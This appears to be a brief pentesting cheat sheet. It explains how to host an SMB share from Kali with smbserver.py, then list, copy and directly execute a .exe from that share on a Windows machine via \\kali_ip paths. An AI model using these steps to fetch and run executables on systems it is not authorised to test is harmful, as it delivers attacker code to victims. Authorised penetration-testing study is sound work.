SMB Server For Pentesting:
=========================
To create a share on kali:
	smbsever.py:
		launches a smb server
		smbserver.py -username user -password pass abcd . -smb2support
			abcd => sharename
To use that share on windows:(both Command Prompt and PowerShell)
	net view \\kali_ip => shows shares 
	copy \\kali_ip\abcd\file_name.exe => to copy some file
	\\kali_ip\abcd\file_name.exe => directly executing the file
Note:
	mistake-1 => not using sharename
	mistake-2 => using '/'(wrong) instead of '\'(correct)
